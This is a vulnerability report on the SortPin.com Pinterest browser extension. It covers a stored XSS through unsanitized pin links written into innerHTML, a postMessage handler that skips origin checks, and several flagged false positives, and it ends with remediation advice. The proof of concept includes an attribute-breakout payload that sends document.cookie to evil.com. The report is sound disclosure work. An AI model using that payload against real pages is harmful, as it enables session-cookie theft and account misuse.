# Vulnerability Report: Pinterest Sort Extension - SortPin.com

**Extension ID:** djcledakkebdgjncnemijiabiaimbaic
**Version:** 2.0.9
**Manifest Version:** 3
**Permissions:** storage, unlimitedStorage
**Content Script Scope:** All pinterest.* domains (26 TLDs)
**Triage Flags:** V1=5, V2=2 -- innerhtml_dynamic, postmessage_no_origin, dynamic_tab_url, dynamic_window_open

---

## Executive Summary

The SortPin.com extension adds pin statistics overlays (saves, likes, comments, etc.) to Pinterest pages. It fetches pin data from Pinterest's internal API and renders it as HTML overlays on each pin card. The extension uses the `webext-bridge` library for inter-context messaging.

Two verified vulnerabilities were found:

1. **Stored XSS via unsanitized Pinterest API data injected into innerHTML** (Medium)
2. **postMessage listener without origin validation in webext-bridge** (Low)

Two additional flagged patterns were evaluated and determined to be non-issues or low-risk:
- `chrome.tabs.create` with hardcoded URL (not a vulnerability)
- `window.open` with hardcoded sortpin.com pricing URL (not a vulnerability)

---

## Vulnerability 1: Stored XSS via Unsanitized Pin Data in innerHTML

**CVSS 3.1:** 5.4 (Medium)
**Vector:** AV:N/AC:H/PR:L/UI:R/S:C/C:L/I:L/A:N
**CWE:** CWE-79 (Improper Neutralization of Input During Web Page Generation)

**File:** `assets/chunk-2ad79f51.js`
**Lines:** 348, 350 (primary); 318-347 (supporting)

### Description

The content script fetches pin metadata from Pinterest's internal API (`/resource/PinResource/get/`) and constructs an HTML overlay for each pin card. The function `x()` (line 311) takes a data object `e` containing fields extracted from the API response and injects them into HTML templates using string concatenation via `innerHTML` and `.replace()` -- with no sanitization or encoding of the injected values.

The critical data flow is:

1. **Source:** Pinterest API response field `resource_response.data.link` (line 175-176), assigned to `e.url` via the `G()` function at line 418: `e.url = _ == null ? void 0 : _.link`
2. **Sink:** Line 348 in function `x()`:
   ```js
   t.innerHTML = t.innerHTML.replace("__DOWNLOAD_BUTTON__",
     window.DOWNLOAD_BUTTON
       .replace("__IMAGE_URL__", e?.image_url)
       .replace("__VIDEO_URL__", e?.story_url || e?.video_url)
       ...
       .replace("__LINK_URL__", e?.url)    // <-- unsanitized user input
       ...
   )
   ```
3. **Template context** (line 122, `window.DOWNLOAD_BUTTON`):
   ```html
   <a href="__LINK_URL__" target="_blank" class="...">
   ```

The `link` field on a Pinterest pin is the external URL that the pin links to. This is a user-supplied field -- any Pinterest user can set the destination URL when creating a pin. If the value contains a double-quote character (`"`), it breaks out of the `href` attribute, allowing injection of arbitrary HTML attributes or elements.

Additionally, `e.id` (the pin ID from the API) is injected at line 350 via:
```js
t.innerHTML = t.innerHTML.replaceAll("__PIN_ID__", e?.id)
```
into the template `data-pin-id="__PIN_ID__"`. While Pinterest pin IDs are normally numeric, the code performs no validation. The same `e.id` is also used unsafely in a `querySelector` at line 357:
```js
document.querySelector(`button[data-pin-id="${e?.id}"][id="bookmark"]`)
```
which could cause a CSS selector injection if the ID contains special characters.

### Proof-of-Concept Exploit Scenario

1. Attacker creates a Pinterest pin with the link URL set to:
   ```
   " onmouseover="fetch('https://evil.com/steal?c='+document.cookie)" x="
   ```
2. A victim who has the SortPin extension installed views a Pinterest page containing this pin.
3. The extension fetches the pin data from the Pinterest API, which returns the attacker's link value in the `link` field.
4. The extension renders the HTML overlay. The resulting DOM contains:
   ```html
   <a href="" onmouseover="fetch('https://evil.com/steal?c='+document.cookie)" x="" target="_blank" class="...">
   ```
5. When the victim hovers over the "Pin Link" button in the SortPin overlay, the injected JavaScript executes in the context of the Pinterest page.

**Important caveat:** Pinterest's API may sanitize or reject URLs containing special characters. The actual exploitability depends on what Pinterest's server-side validation allows. However, the extension performs zero client-side sanitization, violating defense-in-depth principles. If Pinterest's validation is ever bypassed, or if the API returns unexpected data (e.g., through a MITM attack on the API response, a Pinterest bug, or cached/stale data), the XSS is exploitable.

### Impact

- Execute arbitrary JavaScript in the context of any Pinterest page the victim visits
- Steal Pinterest session cookies or CSRF tokens (depending on cookie flags)
- Perform actions on behalf of the victim on Pinterest (pin creation, following, etc.)
- Read private pin/board data visible on the page
- Redirect the user to phishing pages

### Affected Fields

| Field | Source (API) | Template Placeholder | Risk |
|-------|-------------|---------------------|------|
| `e.url` | `_.link` | `__LINK_URL__` | **HIGH** - user-controlled pin link |
| `e.id` | `_.id` | `__PIN_ID__` | LOW - typically numeric |
| `e.image_url` | `_.images.orig.url` | `__IMAGE_URL__` | LOW - Pinterest CDN URL |
| `e.video_url` | `_.videos.video_list[*].url` | `__VIDEO_URL__` | LOW - Pinterest CDN URL |

---

## Vulnerability 2: postMessage Listener Without Origin Validation

**CVSS 3.1:** 3.1 (Low)
**Vector:** AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:L/A:N
**CWE:** CWE-346 (Origin Validation Error)

**File:** `assets/chunk-902915df.js`
**Lines:** 73-96

### Description

The content script uses the `webext-bridge` library for communication between the content script context and the window (page) context. The library establishes a `MessageChannel` between these contexts using `window.postMessage()`.

At line 90-94, the content script sends a port offer to `"*"` (any origin):
```js
window.postMessage({
  cmd: "webext-port-offer",
  scope: c,
  context: e
}, "*", [a.port2])
```

At line 74-83, the incoming message handler does NOT validate `event.origin`:
```js
const o = a => {
    const {
      data: { cmd: g, scope: w, context: s },
      ports: p
    } = a;
    if (g === "webext-port-offer" && w === c && s !== e)
      return window.removeEventListener("message", o),
        p[0].onmessage = n,
        p[0].postMessage("port-accepted"),
        t(p[0])
  }
```

The handler checks that `cmd === "webext-port-offer"`, `scope === c` (the namespace), and `context !== e` (the sender is a different context). However, it does not check `event.origin` to verify the message came from a trusted source.

If the namespace (`c`) is known or guessable, any script running in the same page (e.g., a malicious script injected via XSS, a compromised third-party script on Pinterest, or a malicious browser extension) can craft a `webext-port-offer` message to establish a MessageChannel with the content script.

### Proof-of-Concept Exploit Scenario

1. An attacker injects a script into the Pinterest page (via a separate XSS vulnerability, a compromised ad network, or a malicious extension).
2. The attacker script observes the `webext-port-offer` postMessage to learn the `scope` namespace value.
3. The attacker sends a competing `webext-port-offer` message before the legitimate window context script, including a `MessagePort` in the transfer list.
4. If the content script accepts the attacker's port (race condition), the attacker can now send arbitrary messages through the `webext-bridge` messaging layer.
5. The attacker could potentially invoke extension message handlers such as `get-pin`, `store-pin`, `toggle-bookmark-pin`, etc., by sending properly formatted messages through the established channel.

### Impact

- Limited: The extension's message handlers primarily deal with reading/writing pin data to local storage. There are no highly privileged operations exposed.
- An attacker could potentially manipulate which pins are stored/bookmarked in the extension's local data.
- The practical exploitability is low because it requires: (a) a way to inject script into a Pinterest page, and (b) winning a race condition against the legitimate webext-bridge handshake.

### Note

This is a known limitation of the `webext-bridge` library (the library itself documents that `window.postMessage` is used for content-script-to-window communication). The library does require a namespace to be set, which provides a weak form of isolation. However, the namespace is not a secret and can be observed by any in-page script.

---

## Non-Vulnerabilities (False Positives)

### dynamic_tab_url Flag

**File:** `assets/chunk-93b8641e.js`, line 356

```js
chrome.runtime.onInstalled.addListener(function(e) {
  let t = "https://sortpin.com/how-to-install-pinterest-sorting-extension";
  e.reason === chrome.runtime.OnInstalledReason.INSTALL && chrome.tabs.create({
    url: t
  }, function(n) { ... })
});
```

**Assessment:** NOT a vulnerability. The URL is hardcoded to `sortpin.com` and only fires on initial extension installation. This is a standard onboarding pattern.

### dynamic_window_open Flag

**File:** `assets/chunk-e62c360d.js`, line 978

```js
const y = `https://sortpin.com/pricing?${new URLSearchParams({
  utm_source:"extension",
  utm_medium:"reminder_modal",
  utm_campaign:"free_to_premium",
  utm_content:`dismissed_${r}`
}).toString()}`;
window.open(y, "_blank")
```

**Assessment:** NOT a vulnerability. The base URL is hardcoded to `sortpin.com`. The only dynamic component is the `utm_content` parameter containing a numeric dismissed count (`r`), which is sourced from local storage. No user input reaches this URL.

### innerHTML in React / react-helmet Libraries

**Files:** `assets/chunk-f8b08b5f.js` (React), `assets/chunk-ab68482d.js` (react-helmet / PapaParse)

**Assessment:** NOT a vulnerability. These are standard library patterns:
- React's SVG innerHTML polyfill (chunk-f8b08b5f.js:786-789) with `namespaceURI` check
- react-helmet's `dangerouslySetInnerHTML` for `<script>`, `<noscript>`, `<style>` tags
- PapaParse worker message handling

These are well-known library internals, not extension-specific code.

---

## Recommendations

1. **Sanitize all Pinterest API data before innerHTML injection.** Use `textContent` for text values, and for HTML templates, either:
   - Use `document.createElement()` and `setAttribute()` instead of string concatenation + innerHTML
   - HTML-encode all dynamic values before insertion (escape `<`, `>`, `"`, `'`, `&`)

2. **Validate and encode URL values** before inserting into `href` attributes. At minimum, verify URLs start with `https://` or `http://` and contain no `"` characters.

3. **Pin IDs used in `querySelector`** should be validated as numeric before string interpolation into CSS selectors.

4. **For webext-bridge messaging**, consider adding an origin check in the `message` event handler, or using a cryptographically random namespace that is not exposed to page scripts.
